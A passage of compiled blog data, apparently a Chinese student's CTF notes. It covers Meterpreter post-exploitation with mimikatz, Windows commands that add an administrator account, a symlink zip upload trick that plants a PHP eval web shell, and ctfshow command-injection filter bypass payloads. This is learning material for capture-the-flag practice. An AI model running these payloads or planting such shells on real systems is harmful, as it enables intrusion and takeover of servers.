src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725220840944" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png" data="aurora"></p>\n<p>利用一下，提权完毕</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230725221029006" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png" data="aurora"></p>\n<h2 id="后渗透" tabindex="-1"><a class="header-anchor" href="#后渗透" aria-hidden="true">#</a> 后渗透</h2>\n<p>后渗透就感觉很刑了</p>\n<p>多个方法玩转主机</p>\n<p>help查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的</p>\n<p>所以呢肯定得搞一个中文版看看<a href="https://blog.csdn.net/weixin_45605352/article/details/115824811" target="_blank" rel="noopener noreferrer">(Meterpreter命令详解）<ExternalLinkIcon/></a></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726153009757" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png" data="aurora"></p>\n<p>要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了</p>\n<p>meterpreter 是可以加载很多模块进行利用的</p>\n<h3 id="模块利用" tabindex="-1"><a class="header-anchor" href="#模块利用" aria-hidden="true">#</a> 模块利用</h3>\n<p>我是先学了<strong>kiwi</strong>模块</p>\n<p>这个首先得load kiwi加载模块</p>\n<p>其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的</p>\n<p>sysinfo看系统信息</p>\n<p>ps看进程</p>\n<p>migrate [PID]换进程</p>\n<p>具体可以参考<a href="https://blog.csdn.net/weixin_45588247/article/details/119497964" target="_blank" rel="noopener noreferrer">MSF中kiwi(mimikatz)模块的使用<ExternalLinkIcon/></a></p>\n<p>这个是shell中主机操作 <a href="https://chenchena.blog.csdn.net/article/details/124493550" target="_blank" rel="noopener noreferrer">后渗透主机操作_渗透后控制主机_<ExternalLinkIcon/></a>用来关关防火墙，远控桌面</p>\n<h3 id="cmd命令" tabindex="-1"><a class="header-anchor" href="#cmd命令" aria-hidden="true">#</a> cmd命令</h3>\n<p>补一条拿了管理员权限增加用户命令</p>\n<p>net user [name] [paaswd] /add #增加用户</p>\n<p>net localgroup #查看计算机本地组用户，看一下什么是有管理员权限的</p>\n<p>net user [name]# 用于查看用户的相关信息，可以看用户组的改变</p>\n<p>net localgroup Adminstrators(组) [name] /add</p>\n<h2 id="文件格式" tabindex="-1"><a class="header-anchor" href="#文件格式" aria-hidden="true">#</a> 文件格式</h2>\n<h3 id="文件头和文件尾" tabindex="-1"><a class="header-anchor" href="#文件头和文件尾" aria-hidden="true">#</a> 文件头和文件尾</h3>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\nPNG (png)，            　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\nGIF (gif)，              　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                 ZIP Archive (zip)，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\n\nTIFF (tif)，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\nWindows Bitmap (bmp)，      文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\nCAD (dwg)，               文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\nAdobe Photoshop (psd)，      文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\nRich Text Format (rtf)，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\nXML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\nHTML (html)，              文件头：68746D6C3E\nEmail [thorough only] (eml)，   文件头：44656C69766572792D646174653A\nOutlook Express (dbx)，       文件头：CFAD12FEC5FD746F\nOutlook (pst)，             文件头：2142444E\nMS Word/Excel (xls.or.doc)，    文件头：D0CF11E0\nMS Access (mdb)，           文件头：5374616E64617264204A\nWordPerfect (wpd)，          文件头：FF575043\nAdobe Acrobat (pdf)，        文件头：255044462D312E\nQuicken (qdf)，             文件头：AC9EBD8F\nWindows Password (pwl)，     文件头：E3828596\n\nRAR Archive (rar)，           文件头：52617221\nWave (wav)，               文件头：57415645\nAVI (avi)，                 文件头：41564920\nReal Audio (ram)，           文件头：2E7261FD\nReal Media (rm)，            文件头：2E524D46\nMPEG (mpg)，              文件头：000001BA\nMPEG (mpg)，              文件头：000001B3\nQuicktime (mov)，           文件头：6D6F6F76\nWindows Media (asf)，        文件头：3026B2758E66CF11\nMIDI (mid)，                文件头：4D546864\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div>',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/tool/1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/tool/1.md",filePathRelative:"tool/1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tool/1.html.vue",componentFilePathRelative:"pages/tool/1.html.vue",componentFileChunkName:"v-811949f4",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tool/1.html.js",dataFilePathRelative:"pages/tool/1.html.js",dataFileChunkName:"v-811949f4",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/tool/1.html",htmlFilePathRelative:"tool/1.html"},{data:{key:"v-83363a96",path:"/web/ciscn.html",title:"ciscn初赛刷题",lang:"zh-CN",frontmatter:{date:"2023/5/30 19:57",stick:!0,keyword:"misc,ctfshow",description:"刷题",title:"ciscn初赛刷题",tag:["刷题"],categories:["ciscn初赛","歪比八卜"]},excerpt:"",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],git:{}},key:"v-83363a96",path:"/web/ciscn.html",title:"ciscn初赛刷题",lang:"zh-CN",frontmatter:{date:"2023/5/30 19:57",stick:!0,keyword:"misc,ctfshow",description:"刷题",title:"ciscn初赛刷题",tag:["刷题"],categories:["ciscn初赛","歪比八卜"]},excerpt:"",headers:[{level:3,title:"unzip",slug:"unzip",children:[]}],content:'\r\n### unzip\r\n\r\n```php\r\n <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\r\nif (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === \'application/zip\'){\r\n    exec(\'cd /tmp && unzip -o \' . $_FILES["file"]["tmp_name"]);\r\n}; \r\n```\r\n\r\n> 网站源码如上 \r\n>\r\n> 大概意思就是[$_FILES](https://blog.csdn.net/weixin_46142761/article/details/121858917)的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录 \r\n>\r\n> 这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了\r\n\r\n> 首先建立软连接\r\n\r\n![image-20230529203732497](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png)\r\n\r\n![image-20230529203805218](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png)\r\n\r\n> 进入到文件夹中然后写一个马\r\n>\r\n> 马的内容是\r\n>\r\n> ```php\r\n> <?php eval($_POST["1"]);?>\r\n> ```\r\n\r\n![image-20230529203956226](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png)\r\n\r\n> 这里用到了zip命令中的-y参数[zip命令详解](https://www.cnbugs.com/post-4092.html)\r\n>\r\n> -y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；\r\n>\r\n> -r 是递归处理，将指定目录下的所有文件和子目录一并处理；\r\n\r\n![image-20230529204737313](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png)\r\n\r\n> 构建好两个压缩包就可以开始上传了\r\n>\r\n> 先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录/var/www/html\r\n>\r\n> 然后就可以愉快rce了\r\n\r\n![image-20230529205248147](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png)',contentRendered:'<h3 id="unzip" tabindex="-1"><a class="header-anchor" href="#unzip" aria-hidden="true">#</a> unzip</h3>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>\n<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">\'application/zip\'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">\'cd /tmp &amp;&amp; unzip -o \'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span> \n</span></code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><blockquote>\n<p>网站源码如上</p>\n<p>大概意思就是<a href="https://blog.csdn.net/weixin_46142761/article/details/121858917" target="_blank" rel="noopener noreferrer">$_FILES<ExternalLinkIcon/></a>的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录</p>\n<p>这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了</p>\n</blockquote>\n<blockquote>\n<p>首先建立软连接</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203732497" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203805218" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png" data="aurora"></p>\n<blockquote>\n<p>进入到文件夹中然后写一个马</p>\n<p>马的内容是</p>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529203956226" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png" data="aurora"></p>\n<blockquote>\n<p>这里用到了zip命令中的-y参数<a href="https://www.cnbugs.com/post-4092.html" target="_blank" rel="noopener noreferrer">zip命令详解<ExternalLinkIcon/></a></p>\n<p>-y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；</p>\n<p>-r 是递归处理，将指定目录下的所有文件和子目录一并处理；</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529204737313" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png" data="aurora"></p>\n<blockquote>\n<p>构建好两个压缩包就可以开始上传了</p>\n<p>先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录/var/www/html</p>\n<p>然后就可以愉快rce了</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230529205248147" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png" data="aurora"></p>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/ciscn.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"ciscn",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/ciscn.md",filePathRelative:"web/ciscn.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/ciscn.html.vue",componentFilePathRelative:"pages/web/ciscn.html.vue",componentFileChunkName:"v-83363a96",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/ciscn.html.js",dataFilePathRelative:"pages/web/ciscn.html.js",dataFileChunkName:"v-83363a96",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/ciscn.html",htmlFilePathRelative:"web/ciscn.html"},{data:{key:"v-d8e4d770",path:"/web/web1.html",title:"命令执行刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"命令执行刷题",tag:["ctfshow刷题"],categories:["命令执行","歪比八卜"]},excerpt:"",headers:[{level:2,title:"命令执行",slug:"命令执行",children:[{level:3,title:"Web29-37",slug:"web29-37",children:[]},{level:3,title:"Web39",slug:"web39",children:[]},{level:3,title:"Web40",slug:"web40",children:[]},{level:3,title:"Web43",slug:"web43",children:[]},{level:3,title:"Web44",slug:"web44",children:[]},{level:3,title:"Web45",slug:"web45",children:[]},{level:3,title:"Web46",slug:"web46",children:[]},{level:3,title:"Web47",slug:"web47",children:[]},{level:3,title:"Web48",slug:"web48",children:[]},{level:3,title:"Web49",slug:"web49",children:[]},{level:3,title:"Web50",slug:"web50",children:[]},{level:3,title:"Web51",slug:"web51",children:[]},{level:3,title:"Web52",slug:"web52",children:[]},{level:3,title:"Web53",slug:"web53",children:[]},{level:3,title:"Web54",slug:"web54",children:[]},{level:3,title:"Web55",slug:"web55",children:[]},{level:3,title:"Web56",slug:"web56",children:[]},{level:3,title:"Web57",slug:"web57",children:[]},{level:3,title:"Web58",slug:"web58",children:[]},{level:3,title:"Web59",slug:"web59",children:[]},{level:3,title:"Web60",slug:"web60",children:[]},{level:3,title:"Web61 62",slug:"web61-62",children:[]},{level:3,title:"Web66",slug:"web66",children:[]},{level:3,title:"Web67",slug:"web67",children:[]},{level:3,title:"Web68",slug:"web68",children:[]},{level:3,title:"Web70",slug:"web70",children:[]},{level:3,title:"Web71",slug:"web71",children:[]},{level:3,title:"Web72",slug:"web72",children:[]},{level:3,title:"Web73",slug:"web73",children:[]},{level:3,title:"Web74",slug:"web74",children:[]},{level:3,title:"Web75",slug:"web75",children:[]}]}],git:{}},key:"v-d8e4d770",path:"/web/web1.html",title:"命令执行刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"命令执行刷题",tag:["ctfshow刷题"],categories:["命令执行","歪比八卜"]},excerpt:"",headers:[{level:2,title:"命令执行",slug:"命令执行",children:[{level:3,title:"Web29-37",slug:"web29-37",children:[]},{level:3,title:"Web39",slug:"web39",children:[]},{level:3,title:"Web40",slug:"web40",children:[]},{level:3,title:"Web43",slug:"web43",children:[]},{level:3,title:"Web44",slug:"web44",children:[]},{level:3,title:"Web45",slug:"web45",children:[]},{level:3,title:"Web46",slug:"web46",children:[]},{level:3,title:"Web47",slug:"web47",children:[]},{level:3,title:"Web48",slug:"web48",children:[]},{level:3,title:"Web49",slug:"web49",children:[]},{level:3,title:"Web50",slug:"web50",children:[]},{level:3,title:"Web51",slug:"web51",children:[]},{level:3,title:"Web52",slug:"web52",children:[]},{level:3,title:"Web53",slug:"web53",children:[]},{level:3,title:"Web54",slug:"web54",children:[]},{level:3,title:"Web55",slug:"web55",children:[]},{level:3,title:"Web56",slug:"web56",children:[]},{level:3,title:"Web57",slug:"web57",children:[]},{level:3,title:"Web58",slug:"web58",children:[]},{level:3,title:"Web59",slug:"web59",children:[]},{level:3,title:"Web60",slug:"web60",children:[]},{level:3,title:"Web61 62",slug:"web61-62",children:[]},{level:3,title:"Web66",slug:"web66",children:[]},{level:3,title:"Web67",slug:"web67",children:[]},{level:3,title:"Web68",slug:"web68",children:[]},{level:3,title:"Web70",slug:"web70",children:[]},{level:3,title:"Web71",slug:"web71",children:[]},{level:3,title:"Web72",slug:"web72",children:[]},{level:3,title:"Web73",slug:"web73",children:[]},{level:3,title:"Web74",slug:"web74",children:[]},{level:3,title:"Web75",slug:"web75",children:[]}]}],content:'\r\n##  命令执行\r\n\r\n### Web29-37\r\n\r\n> 都使用get传参，\r\n\r\n> 根据被屏蔽的字词的不同考虑不同的解法\r\n>\r\n> （1）system（“”）；执行一系列查看文件操作\r\n>\r\n> （2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset \r\n\r\n> 常用Payload   ?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\r\n\r\n> Filter伪协议 常用于读取文件/源码\r\n\r\n### Web39\r\n\r\n> 使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行\r\n\r\n> 短标签就是把<?php 换成<?=  前提是这个功能打开\r\n\r\n> Payload\r\n>\r\n> ```php\r\n> ?c=data://text/plain,<?php system(“tac f*”);?>\r\n> ```\r\n>\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" />\r\n\r\n### Web40\r\n\r\n ![image-20230530153304420](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png)\r\n\r\n\r\n\r\n> **RCE无参数**\r\n\r\n> localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)\r\n\r\n> scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件\r\n\r\n> pos()：返回数组中的当前元素的值。\r\n\r\n> array_reverse()：数组逆序\r\n\r\n> next()： 函数将内部指针指向数组中的下一个元素，并输出。\r\n\r\n> highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)\r\n\r\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" />\r\n\r\n> show_source(next(array_reverse(scandir(pos(localeconv())))));\r\n\r\n> ?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\r\n\r\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" />\r\n\r\n### Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  />\r\n\r\n \r\n\r\n> 代码中插入了>/dev/null 2>&1，“>/dev/null 2>&1”的作用就是不回显。\r\n\r\n> （分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&&或者(%27%27)||绕过\r\n\r\n> 不是很明白的一个点&&需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , / , ? , : , @ , = &可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。\r\n\r\n> Payload：?c=tac f*||\r\n\r\n### Web44\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif)\r\n\r\n> 跟上面一题一样 多了过滤flag 用通配符就行\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif)\r\n\r\n### Web45\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif)\r\n\r\n> 没什么特别的多了过滤空格常见方法如下\r\n\r\n```\r\n%09（url传递）  表示的是tab (cat%09flag.php)\r\n${IFS}\r\n$IFS$9\r\n<>（cat<>flag）\r\n<（cat<flag）\r\n```\r\n\r\n> {cat,flag}原理参考：https://blog.csdn.net/m0_56059226/article/details/117997472\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif)\r\n\r\n### Web46![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif)\r\n\r\n> 过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤\r\n\r\n> 过滤了$ $$$所以不能用${IFS}绕过空格\r\n\r\n> 沿用上一题的payload就行\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" />\r\n\r\n### Web47\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif)\r\n\r\n> 过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容\r\n\r\n> less:与 more 类似\r\n\r\n> head:查看头几行\r\n\r\n> tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\r\n\r\n> tail:查看尾几行\r\n\r\n> nl：显示的时候，顺便输出行号\r\n\r\n> od:以二进制的方式读取档案内容\r\n\r\n> vi:一种编辑器，这个也可以查看\r\n\r\n> vim:一种编辑器，这个也可以查看\r\n\r\n> sort:可以查看\r\n\r\n> uniq:可以查看\r\n\r\n> file -f:报错出具体内容）还是一样用tac没什么好说的\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif)\r\n\r\n### Web48\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif)\r\n\r\n> 还是过滤多了sed cut等Linux命令\r\n\r\n> 用上一题payload\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif)\r\n\r\n### Web49\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif)\r\n\r\n> 多了% 不过跟题目没啥关系 沿用上题payload\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif)\r\n\r\n### Web50\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif)\r\n\r\n> 过滤了&（%26）和tab（%09） 一样啊 用<绕过空格\r\n\r\n> 但是不能用？通配符 ？？？\r\n\r\n> 利用shall特性用’’或者””或者\\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\\t或者c\\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号(\\)转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如\\$，$则不再表示变量的意思。)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif)\r\n\r\n### Web51\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif)\r\n\r\n> 多过滤了tac 换个nl继续用\r\n\r\n> 或者继续ta\\c\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif)\r\n\r\n### Web52\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif)\r\n\r\n> 常规去做 发现过滤了上一题的<> 有点惯性思维去找其他解题方法 没有看见没有过滤$\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif)\r\n\r\n> 发现被耍了 这个flag.php中不是答案\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif)\r\n\r\n> 查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif)\r\n\r\n> 二可行\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif)\r\n\r\n> 查看一下flag这个文件的权限有rx，应该是可以读\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif)\r\n\r\n### Web53\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif)\r\n\r\n> 看了一下是echo函数 然后多了变量d后会system$c\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif)\r\n\r\n> 常规看一下文件内容 有flag.php 直接看\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif)\r\n\r\n### Web54\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif)\r\n\r\n> 在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif)\r\n\r\n### Web55\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif)\r\n\r\n> 过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过/bin/base64输出flag \r\n\r\n> 第二种方法试了下发现不能用 \r\n\r\n> 仔细研究了p神的文章https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\r\n\r\n> 具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. " ./ “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中\r\n\r\n \r\n\r\n> \\2. ” . " 的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）\r\n\r\n> 上传的文件会临时储存在一个地址下一般为/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令\r\n\r\n![image-20230530200618504](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png)\r\n\r\n ![image-20230530200629352](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png)\r\n\r\n> 最后rce\r\n\r\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  />\r\n\r\n### Web56\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif)\r\n\r\n> 比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传\r\n\r\n![image-20230530200527722](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png)\r\n\r\n### Web57\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif)\r\n\r\n> 多过滤了. 和? 